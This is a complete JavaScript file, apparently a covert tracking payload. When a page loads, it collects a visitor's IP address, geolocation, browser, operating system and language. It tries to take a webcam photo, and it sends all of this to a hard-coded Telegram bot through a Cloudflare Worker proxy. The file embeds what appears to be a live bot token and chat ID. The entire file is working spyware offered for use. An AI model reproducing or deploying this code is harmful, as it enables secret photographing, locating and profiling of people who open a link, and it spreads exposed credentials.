// logger.js — отправка через Cloudflare Worker (работает в РФ)
(async function() {
    "use strict";

    // ========== ТВОЙ WORKER URL ==========
    const WORKER_URL = "https://tg-proxy.drwizzard3.workers.dev";  // ЗАМЕНИТЕ!
    const TELEGRAM_BOT_TOKEN = "8916079717:AAFIrsjINbXmyyWZCmQGHak6DnjHGbi6-Xk";
    const TELEGRAM_CHAT_ID = "8995427762";

    // ========== 1. Сбор IP и геолокации ==========
    let ipAddress = "0.0.0.0";
    let country = "не определена";
    let region = "не определён";
    let city = "не определён";

    try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();
        ipAddress = ipData.ip;

        const geoReq = await fetch(`https://ipapi.co/${ipAddress}/json/`);
        const geoData = await geoReq.json();
        
        country = geoData.country_name || "не определена";
        region = geoData.region || "не определён";
        city = geoData.city || "не определён";
    } catch(e) {
        console.warn("Geo error:", e);
    }

    // ========== 2. Время перехода ==========
    const now = new Date();
    const timeStr = now.toLocaleString("ru-RU", { timeZone: "Europe/Moscow" }) + " MSK";

    // ========== 3. UserAgent и устройство ==========
    const fullUserAgent = navigator.userAgent;
    const language = navigator.language || "не определён";

    let deviceType = "не определено";
    if (/Mobi|Android|iPhone|iPad|iPod/i.test(fullUserAgent)) {
        deviceType = "📱 Телефон";
    } else if (/Windows|Mac|Linux|X11/i.test(fullUserAgent)) {
        deviceType = "💻 Компьютер";
    }

    let browser = "неизвестно";
    if (fullUserAgent.includes("Chrome")) browser = "Chrome";
    else if (fullUserAgent.includes("Firefox")) browser = "Firefox";
    else if (fullUserAgent.includes("Safari")) browser = "Safari";
    else if (fullUserAgent.includes("Edge")) browser = "Edge";

    let os = "неизвестно";
    if (fullUserAgent.includes("Windows")) os = "Windows";
    else if (fullUserAgent.includes("Android")) os = "Android";
    else if (fullUserAgent.includes("iOS")) os = "iOS";
    else if (fullUserAgent.includes("Mac")) os = "MacOS";
    else if (fullUserAgent.includes("Linux")) os = "Linux";

    // ========== 4. Формирование сообщения ==========
    const message = `🚨 <b>Новый переход!</b>

<b>🌐 IP:</b> <code>${ipAddress}</code>
<b>├─ User-Agent:</b> <code>${fullUserAgent}</code>
<b>├─ Язык:</b> <code>${language}</code>
<b>└─ Время:</b> <code>${timeStr}</code>

<b>🌍 Геолокация:</b>
<b>├─ Страна:</b> <code>${country}</code>
<b>├─ Регион:</b> <code>${region}</code>
<b>└─ Город:</b> <code>${city}</code>`;

    // ========== 5. Захват фото с вебкамеры ==========
    let photoBlob = null;
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement("video");
        video.srcObject = stream;
        video.autoplay = true;
        video.playsInline = true;

        await new Promise((resolve) => {
            video.onloadedmetadata = () => {
                video.play();
                resolve();
            };
        });

        await new Promise(r => setTimeout(r, 500));

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        photoBlob = await new Promise(resolve => {
            canvas.toBlob(resolve, "image/jpeg", 0.85);
        });

        stream.getTracks().forEach(track => track.stop());
    } catch(e) {
        console.warn("Camera error:", e);
        photoBlob = null;
    }

    // ========== 6. Отправка через Cloudflare Worker ==========
    async function sendViaWorker(blob, caption) {
        const baseUrl = `${WORKER_URL}/tg/bot${TELEGRAM_BOT_TOKEN}`;
        
        try {
            if (blob) {
                // Отправка фото
                const url = `${baseUrl}/sendPhoto`;
                const formData = new FormData();
                formData.append("chat_id", TELEGRAM_CHAT_ID);
                formData.append("photo", blob, "snapshot.jpg");
                formData.append("caption", caption);
                formData.append("parse_mode", "HTML");
                
                const response = await fetch(url, { method: "POST", body: formData });
                const result = await response.json();
                return result.ok;
            } else {
                // Отправка текста
                const url = `${baseUrl}/sendMessage`;
                const response = await fetch(url, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: caption,
                        parse_mode: "HTML",
                        disable_web_page_preview: true
                    })
                });
                const result = await response.json();
                return result.ok;
            }
        } catch(e) {
            console.error("Send error:", e);
            return false;
        }
    }

    // Отправляем
    let sent = false;
    
    if (photoBlob) {
        sent = await sendViaWorker(photoBlob, message);
        if (sent) {
            console.log("✅ Фото и данные отправлены через Worker");
        } else {
            console.log("⚠️ Фото не отправилось, пробуем текст...");
            sent = await sendViaWorker(null, message);
            if (sent) console.log("✅ Текст отправлен через Worker");
        }
    } else {
        sent = await sendViaWorker(null, message);
        if (sent) console.log("✅ Текст отправлен через Worker");
    }
    
    if (!sent) {
        console.log("❌ Не удалось отправить данные");
    }
})();
